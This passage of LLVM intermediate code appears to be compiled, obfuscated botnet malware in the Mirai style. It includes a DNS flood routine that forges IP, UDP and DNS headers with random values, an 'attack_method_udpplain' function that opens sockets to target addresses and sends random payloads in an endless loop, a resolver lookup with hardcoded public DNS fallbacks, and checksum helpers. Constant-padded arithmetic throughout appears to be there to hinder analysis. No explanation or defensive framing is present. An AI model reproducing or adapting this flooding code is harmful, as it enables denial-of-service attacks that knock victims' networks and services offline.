  store i8* %340, i8** %36, align 8
  %341 = load i16, i16* %13, align 2
  %342 = zext i16 %341 to i32
  %343 = icmp eq i32 %342, 65535
  br i1 %343, label %344, label %357

; <label>:344:                                    ; preds = %323
  %345 = call i32 @rand_next()
  %346 = xor i32 %345, -1
  %347 = xor i32 65535, -1
  %348 = xor i32 1539552887, -1
  %349 = or i32 %346, %347
  %350 = or i32 1539552887, %348
  %351 = xor i32 %349, -1
  %352 = and i32 %351, %350
  %353 = and i32 %345, 65535
  %354 = trunc i32 %352 to i16
  %355 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %356 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %355, i32 0, i32 3
  store i16 %354, i16* %356, align 4
  br label %357

; <label>:357:                                    ; preds = %344, %323
  %358 = load i16, i16* %16, align 2
  %359 = zext i16 %358 to i32
  %360 = icmp eq i32 %359, 65535
  br i1 %360, label %361, label %374

; <label>:361:                                    ; preds = %357
  %362 = call i32 @rand_next()
  %363 = xor i32 %362, -1
  %364 = xor i32 65535, -1
  %365 = xor i32 -1427651264, -1
  %366 = or i32 %363, %364
  %367 = or i32 -1427651264, %365
  %368 = xor i32 %366, -1
  %369 = and i32 %368, %367
  %370 = and i32 %362, 65535
  %371 = trunc i32 %369 to i16
  %372 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %373 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %372, i32 0, i32 0
  store i16 %371, i16* %373, align 2
  br label %374

; <label>:374:                                    ; preds = %361, %357
  %375 = load i16, i16* %17, align 2
  %376 = zext i16 %375 to i32
  %377 = icmp eq i32 %376, 65535
  br i1 %377, label %378, label %387

; <label>:378:                                    ; preds = %374
  %379 = call i32 @rand_next()
  %380 = xor i32 65535, -1
  %381 = xor i32 %379, %380
  %382 = and i32 %381, %379
  %383 = and i32 %379, 65535
  %384 = trunc i32 %382 to i16
  %385 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %386 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %385, i32 0, i32 1
  store i16 %384, i16* %386, align 2
  br label %387

; <label>:387:                                    ; preds = %378, %374
  %388 = load i16, i16* %18, align 2
  %389 = zext i16 %388 to i32
  %390 = icmp eq i32 %389, 65535
  br i1 %390, label %391, label %400

; <label>:391:                                    ; preds = %387
  %392 = call i32 @rand_next()
  %393 = xor i32 65535, -1
  %394 = xor i32 %392, %393
  %395 = and i32 %394, %392
  %396 = and i32 %392, 65535
  %397 = trunc i32 %395 to i16
  %398 = load %struct.dnshdr*, %struct.dnshdr** %35, align 8
  %399 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %398, i32 0, i32 0
  store i16 %397, i16* %399, align 2
  br label %400

; <label>:400:                                    ; preds = %391, %387
  %401 = load i8*, i8** %36, align 8
  %402 = load i8, i8* %19, align 1
  %403 = zext i8 %402 to i32
  call void @rand_alpha_str(i8* %401, i32 %403)
  %404 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %405 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %404, i32 0, i32 7
  store i16 0, i16* %405, align 2
  %406 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %407 = bitcast %struct.iphdr* %406 to i16*
  %408 = call zeroext i16 @checksum_generic(i16* %407, i32 20)
  %409 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %410 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %409, i32 0, i32 7
  store i16 %408, i16* %410, align 2
  %411 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %412 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %411, i32 0, i32 3
  store i16 0, i16* %412, align 2
  %413 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %414 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %415 = bitcast %struct.udphdr* %414 to i8*
  %416 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %417 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %416, i32 0, i32 2
  %418 = load i16, i16* %417, align 2
  %419 = load i8, i8* %19, align 1
  %420 = zext i8 %419 to i64
  %421 = sub i64 0, %420
  %422 = sub i64 21, %421
  %423 = add i64 21, %420
  %424 = sub i64 0, %422
  %425 = sub i64 0, 2
  %426 = add i64 %424, %425
  %427 = sub i64 0, %426
  %428 = add i64 %422, 2
  %429 = load i32, i32* %21, align 4
  %430 = sext i32 %429 to i64
  %431 = sub i64 %427, 6846865460212114118
  %432 = add i64 %431, %430
  %433 = add i64 %432, 6846865460212114118
  %434 = add i64 %427, %430
  %435 = sub i64 0, 4
  %436 = sub i64 %433, %435
  %437 = add i64 %433, 4
  %438 = trunc i64 %436 to i32
  %439 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %413, i8* %415, i16 zeroext %418, i32 %438)
  %440 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %441 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %440, i32 0, i32 3
  store i16 %439, i16* %441, align 2
  %442 = load i32, i32* %22, align 4
  %443 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %444 = load i32, i32* %9, align 4
  %445 = sext i32 %444 to i64
  %446 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %443, i64 %445
  %447 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %446, i32 0, i32 0
  %448 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %447, i32 0, i32 2
  %449 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %448, i32 0, i32 0
  store i32 %442, i32* %449, align 4
  %450 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %451 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %450, i32 0, i32 1
  %452 = load i16, i16* %451, align 2
  %453 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %454 = load i32, i32* %9, align 4
  %455 = sext i32 %454 to i64
  %456 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %453, i64 %455
  %457 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %456, i32 0, i32 0
  %458 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %457, i32 0, i32 1
  store i16 %452, i16* %458, align 2
  %459 = load i32, i32* %10, align 4
  %460 = load i8*, i8** %32, align 8
  %461 = load i8, i8* %19, align 1
  %462 = zext i8 %461 to i64
  %463 = add i64 41, 2031566227319331719
  %464 = add i64 %463, %462
  %465 = sub i64 %464, 2031566227319331719
  %466 = add i64 41, %462
  %467 = sub i64 %465, -1987835351923311873
  %468 = add i64 %467, 2
  %469 = add i64 %468, -1987835351923311873
  %470 = add i64 %465, 2
  %471 = load i32, i32* %21, align 4
  %472 = sext i32 %471 to i64
  %473 = add i64 %469, -3761568824023595225
  %474 = add i64 %473, %472
  %475 = sub i64 %474, -3761568824023595225
  %476 = add i64 %469, %472
  %477 = add i64 %475, -2085881344276230567
  %478 = add i64 %477, 4
  %479 = sub i64 %478, -2085881344276230567
  %480 = add i64 %475, 4
  %481 = bitcast %union.__CONST_SOCKADDR_ARG* %37 to %struct.sockaddr**
  %482 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %483 = load i32, i32* %9, align 4
  %484 = sext i32 %483 to i64
  %485 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %482, i64 %484
  %486 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %485, i32 0, i32 0
  %487 = bitcast %struct.sockaddr_in* %486 to %struct.sockaddr*
  store %struct.sockaddr* %487, %struct.sockaddr** %481, align 8
  %488 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %37, i32 0, i32 0
  %489 = load %struct.sockaddr*, %struct.sockaddr** %488, align 8
  %490 = call i64 @sendto(i32 %459, i8* %460, i64 %479, i32 16384, %struct.sockaddr* %489, i32 16)
  br label %491

; <label>:491:                                    ; preds = %400
  %492 = load i32, i32* %9, align 4
  %493 = add i32 %492, 175336813
  %494 = add i32 %493, 1
  %495 = sub i32 %494, 175336813
  %496 = add nsw i32 %492, 1
  store i32 %495, i32* %9, align 4
  br label %318

; <label>:497:                                    ; preds = %318
  br label %317

; <label>:498:                                    ; preds = %92, %86, %80
  ret void
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @get_dns_resolver() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca [2048 x i8], align 16
  %6 = alloca i32, align 4
  %7 = alloca [32 x i8], align 16
  %8 = alloca i8, align 1
  %9 = alloca i8, align 1
  %10 = alloca i8, align 1
  call void @table_unlock_val(i8 zeroext 21)
  %11 = call i8* @table_retrieve_val(i32 21, i32* null)
  %12 = call i32 (i8*, i32, ...) @open(i8* %11, i32 0)
  store i32 %12, i32* %2, align 4
  call void @table_lock_val(i8 zeroext 21)
  %13 = load i32, i32* %2, align 4
  %14 = icmp sge i32 %13, 0
  br i1 %14, label %15, label %104

; <label>:15:                                     ; preds = %0
  %16 = load i32, i32* %2, align 4
  %17 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i32 0, i32 0
  %18 = call i64 @read(i32 %16, i8* %17, i64 2048)
  %19 = trunc i64 %18 to i32
  store i32 %19, i32* %3, align 4
  %20 = load i32, i32* %2, align 4
  %21 = call i32 @close(i32 %20)
  call void @table_unlock_val(i8 zeroext 22)
  %22 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i32 0, i32 0
  %23 = load i32, i32* %3, align 4
  %24 = call i8* @table_retrieve_val(i32 22, i32* null)
  %25 = call i32 @util_stristr(i8* %22, i32 %23, i8* %24)
  store i32 %25, i32* %4, align 4
  call void @table_lock_val(i8 zeroext 22)
  %26 = load i32, i32* %4, align 4
  %27 = icmp ne i32 %26, -1
  br i1 %27, label %28, label %103

; <label>:28:                                     ; preds = %15
  store i8 0, i8* %8, align 1
  store i8 0, i8* %9, align 1
  %29 = load i32, i32* %4, align 4
  store i32 %29, i32* %6, align 4
  br label %30

; <label>:30:                                     ; preds = %91, %28
  %31 = load i32, i32* %6, align 4
  %32 = load i32, i32* %3, align 4
  %33 = icmp slt i32 %31, %32
  br i1 %33, label %34, label %96

; <label>:34:                                     ; preds = %30
  %35 = load i32, i32* %6, align 4
  %36 = sext i32 %35 to i64
  %37 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i64 0, i64 %36
  %38 = load i8, i8* %37, align 1
  store i8 %38, i8* %10, align 1
  %39 = load i8, i8* %8, align 1
  %40 = icmp ne i8 %39, 0
  br i1 %40, label %52, label %41

; <label>:41:                                     ; preds = %34
  %42 = load i8, i8* %10, align 1
  %43 = sext i8 %42 to i32
  %44 = icmp eq i32 %43, 32
  br i1 %44, label %49, label %45

; <label>:45:                                     ; preds = %41
  %46 = load i8, i8* %10, align 1
  %47 = sext i8 %46 to i32
  %48 = icmp eq i32 %47, 9
  br i1 %48, label %49, label %50

; <label>:49:                                     ; preds = %45, %41
  br label %91

; <label>:50:                                     ; preds = %45
  store i8 1, i8* %8, align 1
  br label %51

; <label>:51:                                     ; preds = %50
  br label %52

; <label>:52:                                     ; preds = %51, %34
  %53 = load i8, i8* %10, align 1
  %54 = sext i8 %53 to i32
  %55 = icmp ne i32 %54, 46
  br i1 %55, label %56, label %64

; <label>:56:                                     ; preds = %52
  %57 = load i8, i8* %10, align 1
  %58 = sext i8 %57 to i32
  %59 = icmp slt i32 %58, 48
  br i1 %59, label %71, label %60

; <label>:60:                                     ; preds = %56
  %61 = load i8, i8* %10, align 1
  %62 = sext i8 %61 to i32
  %63 = icmp sgt i32 %62, 57
  br i1 %63, label %71, label %64

; <label>:64:                                     ; preds = %60, %52
  %65 = load i32, i32* %6, align 4
  %66 = load i32, i32* %3, align 4
  %67 = sub i32 0, 1
  %68 = add i32 %66, %67
  %69 = sub nsw i32 %66, 1
  %70 = icmp eq i32 %65, %68
  br i1 %70, label %71, label %90

; <label>:71:                                     ; preds = %64, %60, %56
  %72 = getelementptr inbounds [32 x i8], [32 x i8]* %7, i32 0, i32 0
  %73 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i32 0, i32 0
  %74 = load i32, i32* %4, align 4
  %75 = sext i32 %74 to i64
  %76 = getelementptr inbounds i8, i8* %73, i64 %75
  %77 = load i32, i32* %6, align 4
  %78 = load i32, i32* %4, align 4
  %79 = sub i32 0, %78
  %80 = add i32 %77, %79
  %81 = sub nsw i32 %77, %78
  call void @util_memcpy(i8* %72, i8* %76, i32 %80)
  %82 = load i32, i32* %6, align 4
  %83 = load i32, i32* %4, align 4
  %84 = sub i32 %82, 458621850
  %85 = sub i32 %84, %83
  %86 = add i32 %85, 458621850
  %87 = sub nsw i32 %82, %83
  %88 = sext i32 %86 to i64
  %89 = getelementptr inbounds [32 x i8], [32 x i8]* %7, i64 0, i64 %88
  store i8 0, i8* %89, align 1
  store i8 1, i8* %9, align 1
  br label %96

; <label>:90:                                     ; preds = %64
  br label %91

; <label>:91:                                     ; preds = %90, %49
  %92 = load i32, i32* %6, align 4
  %93 = sub i32 0, 1
  %94 = sub i32 %92, %93
  %95 = add nsw i32 %92, 1
  store i32 %94, i32* %6, align 4
  br label %30

; <label>:96:                                     ; preds = %71, %30
  %97 = load i8, i8* %9, align 1
  %98 = icmp ne i8 %97, 0
  br i1 %98, label %99, label %102

; <label>:99:                                     ; preds = %96
  %100 = getelementptr inbounds [32 x i8], [32 x i8]* %7, i32 0, i32 0
  %101 = call i32 @inet_addr(i8* %100) #6
  store i32 %101, i32* %1, align 4
  br label %115

; <label>:102:                                    ; preds = %96
  br label %103

; <label>:103:                                    ; preds = %102, %15
  br label %104

; <label>:104:                                    ; preds = %103, %0
  %105 = call i32 @rand_next()
  %106 = urem i32 %105, 4
  switch i32 %106, label %115 [
    i32 0, label %107
    i32 1, label %109
    i32 2, label %111
    i32 3, label %113
  ]

; <label>:107:                                    ; preds = %104
  %108 = call i32 @htonl(i32 134744072) #7
  store i32 %108, i32* %1, align 4
  br label %115

; <label>:109:                                    ; preds = %104
  %110 = call i32 @htonl(i32 1246898730) #7
  store i32 %110, i32* %1, align 4
  br label %115

; <label>:111:                                    ; preds = %104
  %112 = call i32 @htonl(i32 1074151430) #7
  store i32 %112, i32* %1, align 4
  br label %115

; <label>:113:                                    ; preds = %104
  %114 = call i32 @htonl(i32 67240450) #7
  store i32 %114, i32* %1, align 4
  br label %115

; <label>:115:                                    ; preds = %113, %111, %109, %107, %104, %99
  %116 = load i32, i32* %1, align 4
  ret i32 %116
}

declare i32 @util_strlen(i8*) #3

declare i32 @open(i8*, i32, ...) #3

declare i64 @read(i32, i8*, i64) #3

declare i32 @util_stristr(i8*, i32, i8*) #3

; Function Attrs: noinline nounwind uwtable
define void @attack_method_udpplain(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i8**, align 8
  %11 = alloca i32*, align 8
  %12 = alloca i16, align 2
  %13 = alloca i16, align 2
  %14 = alloca i16, align 2
  %15 = alloca i8, align 1
  %16 = alloca %struct.sockaddr_in, align 4
  %17 = alloca %struct.iphdr*, align 8
  %18 = alloca %struct.udphdr*, align 8
  %19 = alloca i8*, align 8
  %20 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %21 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %22 = alloca i8*, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %23 = load i8, i8* %5, align 1
  %24 = zext i8 %23 to i64
  %25 = call noalias i8* @calloc(i64 %24, i64 8) #6
  %26 = bitcast i8* %25 to i8**
  store i8** %26, i8*** %10, align 8
  %27 = load i8, i8* %5, align 1
  %28 = zext i8 %27 to i64
  %29 = call noalias i8* @calloc(i64 %28, i64 4) #6
  %30 = bitcast i8* %29 to i32*
  store i32* %30, i32** %11, align 8
  %31 = load i8, i8* %7, align 1
  %32 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %33 = call i32 @attack_get_opt_int(i8 zeroext %31, %struct.attack_option* %32, i8 zeroext 7, i32 65535)
  %34 = trunc i32 %33 to i16
  store i16 %34, i16* %12, align 2
  %35 = load i8, i8* %7, align 1
  %36 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %37 = call i32 @attack_get_opt_int(i8 zeroext %35, %struct.attack_option* %36, i8 zeroext 6, i32 65535)
  %38 = trunc i32 %37 to i16
  store i16 %38, i16* %13, align 2
  %39 = load i8, i8* %7, align 1
  %40 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %41 = call i32 @attack_get_opt_int(i8 zeroext %39, %struct.attack_option* %40, i8 zeroext 0, i32 512)
  %42 = trunc i32 %41 to i16
  store i16 %42, i16* %14, align 2
  %43 = load i8, i8* %7, align 1
  %44 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %45 = call i32 @attack_get_opt_int(i8 zeroext %43, %struct.attack_option* %44, i8 zeroext 1, i32 1)
  %46 = trunc i32 %45 to i8
  store i8 %46, i8* %15, align 1
  %47 = bitcast %struct.sockaddr_in* %16 to i8*
  call void @llvm.memset.p0i8.i64(i8* %47, i8 0, i64 16, i32 4, i1 false)
  %48 = load i16, i16* %13, align 2
  %49 = zext i16 %48 to i32
  %50 = icmp eq i32 %49, 65535
  br i1 %50, label %51, label %54

; <label>:51:                                     ; preds = %4
  %52 = call i32 @rand_next()
  %53 = trunc i32 %52 to i16
  store i16 %53, i16* %13, align 2
  br label %57

; <label>:54:                                     ; preds = %4
  %55 = load i16, i16* %13, align 2
  %56 = call zeroext i16 @htons(i16 zeroext %55) #7
  store i16 %56, i16* %13, align 2
  br label %57

; <label>:57:                                     ; preds = %54, %51
  store i32 0, i32* %9, align 4
  br label %58

; <label>:58:                                     ; preds = %173, %57
  %59 = load i32, i32* %9, align 4
  %60 = load i8, i8* %5, align 1
  %61 = zext i8 %60 to i32
  %62 = icmp slt i32 %59, %61
  br i1 %62, label %63, label %179

; <label>:63:                                     ; preds = %58
  %64 = call noalias i8* @calloc(i64 65535, i64 1) #6
  %65 = load i8**, i8*** %10, align 8
  %66 = load i32, i32* %9, align 4
  %67 = sext i32 %66 to i64
  %68 = getelementptr inbounds i8*, i8** %65, i64 %67
  store i8* %64, i8** %68, align 8
  %69 = load i16, i16* %12, align 2
  %70 = zext i16 %69 to i32
  %71 = icmp eq i32 %70, 65535
  br i1 %71, label %72, label %81

; <label>:72:                                     ; preds = %63
  %73 = call i32 @rand_next()
  %74 = trunc i32 %73 to i16
  %75 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %76 = load i32, i32* %9, align 4
  %77 = sext i32 %76 to i64
  %78 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %75, i64 %77
  %79 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %78, i32 0, i32 0
  %80 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %79, i32 0, i32 1
  store i16 %74, i16* %80, align 2
  br label %90

; <label>:81:                                     ; preds = %63
  %82 = load i16, i16* %12, align 2
  %83 = call zeroext i16 @htons(i16 zeroext %82) #7
  %84 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %85 = load i32, i32* %9, align 4
  %86 = sext i32 %85 to i64
  %87 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %84, i64 %86
  %88 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %87, i32 0, i32 0
  %89 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %88, i32 0, i32 1
  store i16 %83, i16* %89, align 2
  br label %90

; <label>:90:                                     ; preds = %81, %72
  %91 = call i32 @socket(i32 2, i32 2, i32 17) #6
  %92 = load i32*, i32** %11, align 8
  %93 = load i32, i32* %9, align 4
  %94 = sext i32 %93 to i64
  %95 = getelementptr inbounds i32, i32* %92, i64 %94
  store i32 %91, i32* %95, align 4
  %96 = icmp eq i32 %91, -1
  br i1 %96, label %97, label %98

; <label>:97:                                     ; preds = %90
  ret void

; <label>:98:                                     ; preds = %90
  %99 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %99, align 4
  %100 = load i16, i16* %13, align 2
  %101 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %100, i16* %101, align 2
  %102 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %103 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %102, i32 0, i32 0
  store i32 0, i32* %103, align 4
  %104 = load i32*, i32** %11, align 8
  %105 = load i32, i32* %9, align 4
  %106 = sext i32 %105 to i64
  %107 = getelementptr inbounds i32, i32* %104, i64 %106
  %108 = load i32, i32* %107, align 4
  %109 = bitcast %union.__CONST_SOCKADDR_ARG* %20 to %struct.sockaddr**
  %110 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  store %struct.sockaddr* %110, %struct.sockaddr** %109, align 8
  %111 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %20, i32 0, i32 0
  %112 = load %struct.sockaddr*, %struct.sockaddr** %111, align 8
  %113 = call i32 @bind(i32 %108, %struct.sockaddr* %112, i32 16) #6
  %114 = icmp eq i32 %113, -1
  br i1 %114, label %115, label %116

; <label>:115:                                    ; preds = %98
  br label %116

; <label>:116:                                    ; preds = %115, %98
  %117 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %118 = load i32, i32* %9, align 4
  %119 = sext i32 %118 to i64
  %120 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %117, i64 %119
  %121 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %120, i32 0, i32 2
  %122 = load i8, i8* %121, align 4
  %123 = zext i8 %122 to i32
  %124 = icmp slt i32 %123, 32
  br i1 %124, label %125, label %154

; <label>:125:                                    ; preds = %116
  %126 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %127 = load i32, i32* %9, align 4
  %128 = sext i32 %127 to i64
  %129 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %126, i64 %128
  %130 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %129, i32 0, i32 1
  %131 = load i32, i32* %130, align 4
  %132 = call i32 @ntohl(i32 %131) #7
  %133 = call i32 @rand_next()
  %134 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %135 = load i32, i32* %9, align 4
  %136 = sext i32 %135 to i64
  %137 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %134, i64 %136
  %138 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %137, i32 0, i32 2
  %139 = load i8, i8* %138, align 4
  %140 = zext i8 %139 to i32
  %141 = lshr i32 %133, %140
  %142 = add i32 %132, 1714276697
  %143 = add i32 %142, %141
  %144 = sub i32 %143, 1714276697
  %145 = add i32 %132, %141
  %146 = call i32 @htonl(i32 %144) #7
  %147 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %148 = load i32, i32* %9, align 4
  %149 = sext i32 %148 to i64
  %150 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %147, i64 %149
  %151 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %150, i32 0, i32 0
  %152 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %151, i32 0, i32 2
  %153 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %152, i32 0, i32 0
  store i32 %146, i32* %153, align 4
  br label %154

; <label>:154:                                    ; preds = %125, %116
  %155 = load i32*, i32** %11, align 8
  %156 = load i32, i32* %9, align 4
  %157 = sext i32 %156 to i64
  %158 = getelementptr inbounds i32, i32* %155, i64 %157
  %159 = load i32, i32* %158, align 4
  %160 = bitcast %union.__CONST_SOCKADDR_ARG* %21 to %struct.sockaddr**
  %161 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %162 = load i32, i32* %9, align 4
  %163 = sext i32 %162 to i64
  %164 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %161, i64 %163
  %165 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %164, i32 0, i32 0
  %166 = bitcast %struct.sockaddr_in* %165 to %struct.sockaddr*
  store %struct.sockaddr* %166, %struct.sockaddr** %160, align 8
  %167 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %21, i32 0, i32 0
  %168 = load %struct.sockaddr*, %struct.sockaddr** %167, align 8
  %169 = call i32 @connect(i32 %159, %struct.sockaddr* %168, i32 16)
  %170 = icmp eq i32 %169, -1
  br i1 %170, label %171, label %172

; <label>:171:                                    ; preds = %154
  br label %172

; <label>:172:                                    ; preds = %171, %154
  br label %173

; <label>:173:                                    ; preds = %172
  %174 = load i32, i32* %9, align 4
  %175 = add i32 %174, -1948447455
  %176 = add i32 %175, 1
  %177 = sub i32 %176, -1948447455
  %178 = add nsw i32 %174, 1
  store i32 %177, i32* %9, align 4
  br label %58

; <label>:179:                                    ; preds = %58
  br label %180

; <label>:180:                                    ; preds = %215, %179
  store i32 0, i32* %9, align 4
  br label %181

; <label>:181:                                    ; preds = %208, %180
  %182 = load i32, i32* %9, align 4
  %183 = load i8, i8* %5, align 1
  %184 = zext i8 %183 to i32
  %185 = icmp slt i32 %182, %184
  br i1 %185, label %186, label %215

; <label>:186:                                    ; preds = %181
  %187 = load i8**, i8*** %10, align 8
  %188 = load i32, i32* %9, align 4
  %189 = sext i32 %188 to i64
  %190 = getelementptr inbounds i8*, i8** %187, i64 %189
  %191 = load i8*, i8** %190, align 8
  store i8* %191, i8** %22, align 8
  %192 = load i8, i8* %15, align 1
  %193 = icmp ne i8 %192, 0
  br i1 %193, label %194, label %198

; <label>:194:                                    ; preds = %186
  %195 = load i8*, i8** %22, align 8
  %196 = load i16, i16* %14, align 2
  %197 = zext i16 %196 to i32
  call void @rand_str(i8* %195, i32 %197)
  br label %198

; <label>:198:                                    ; preds = %194, %186
  %199 = load i32*, i32** %11, align 8
  %200 = load i32, i32* %9, align 4
  %201 = sext i32 %200 to i64
  %202 = getelementptr inbounds i32, i32* %199, i64 %201
  %203 = load i32, i32* %202, align 4
  %204 = load i8*, i8** %22, align 8
  %205 = load i16, i16* %14, align 2
  %206 = zext i16 %205 to i64
  %207 = call i64 @send(i32 %203, i8* %204, i64 %206, i32 16384)
  br label %208

; <label>:208:                                    ; preds = %198
  %209 = load i32, i32* %9, align 4
  %210 = sub i32 0, %209
  %211 = sub i32 0, 1
  %212 = add i32 %210, %211
  %213 = sub i32 0, %212
  %214 = add nsw i32 %209, 1
  store i32 %213, i32* %9, align 4
  br label %181

; <label>:215:                                    ; preds = %181
  br label %180
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @checksum_generic(i16*, i32) #0 {
  %3 = alloca i16*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i64, align 8
  store i16* %0, i16** %3, align 8
  store i32 %1, i32* %4, align 4
  store i64 0, i64* %5, align 8
  store i64 0, i64* %5, align 8
  br label %6

; <label>:6:                                      ; preds = %19, %2
  %7 = load i32, i32* %4, align 4
  %8 = icmp ugt i32 %7, 1
  br i1 %8, label %9, label %25

; <label>:9:                                      ; preds = %6
  %10 = load i16*, i16** %3, align 8
  %11 = getelementptr inbounds i16, i16* %10, i32 1
  store i16* %11, i16** %3, align 8
  %12 = load i16, i16* %10, align 2
  %13 = zext i16 %12 to i64
  %14 = load i64, i64* %5, align 8
  %15 = sub i64 %14, 7075515278136399642
  %16 = add i64 %15, %13
  %17 = add i64 %16, 7075515278136399642
  %18 = add i64 %14, %13
  store i64 %17, i64* %5, align 8
  br label %19

; <label>:19:                                     ; preds = %9
  %20 = load i32, i32* %4, align 4
  %21 = sub i32 %20, 334228364
  %22 = sub i32 %21, 2
  %23 = add i32 %22, 334228364
  %24 = sub i32 %20, 2
  store i32 %23, i32* %4, align 4
  br label %6

; <label>:25:                                     ; preds = %6
  %26 = load i32, i32* %4, align 4
  %27 = icmp eq i32 %26, 1
  br i1 %27, label %28, label %39

; <label>:28:                                     ; preds = %25
  %29 = load i16*, i16** %3, align 8
  %30 = load i16, i16* %29, align 2
  %31 = trunc i16 %30 to i8
  %32 = sext i8 %31 to i64
  %33 = load i64, i64* %5, align 8
  %34 = sub i64 0, %33
  %35 = sub i64 0, %32
  %36 = add i64 %34, %35
  %37 = sub i64 0, %36
  %38 = add i64 %33, %32
  store i64 %37, i64* %5, align 8
  br label %39

; <label>:39:                                     ; preds = %28, %25
  %40 = load i64, i64* %5, align 8
  %41 = lshr i64 %40, 16
  %42 = load i64, i64* %5, align 8
  %43 = xor i64 65535, -1
  %44 = xor i64 %42, %43
  %45 = and i64 %44, %42
  %46 = and i64 %42, 65535
  %47 = sub i64 0, %45
  %48 = sub i64 %41, %47
  %49 = add i64 %41, %45
  store i64 %48, i64* %5, align 8
  %50 = load i64, i64* %5, align 8
  %51 = lshr i64 %50, 16
  %52 = load i64, i64* %5, align 8
  %53 = add i64 %52, -4426350301001774551
  %54 = add i64 %53, %51
  %55 = sub i64 %54, -4426350301001774551
  %56 = add i64 %52, %51
  store i64 %55, i64* %5, align 8
  %57 = load i64, i64* %5, align 8
  %58 = xor i64 %57, -1
  %59 = and i64 -1, %58
  %60 = xor i64 -1, -1
  %61 = and i64 %57, %60
  %62 = or i64 %59, %61
  %63 = xor i64 %57, -1
  %64 = trunc i64 %62 to i16
  ret i16 %64
}

; Function Attrs: noinline nounwind uwtable
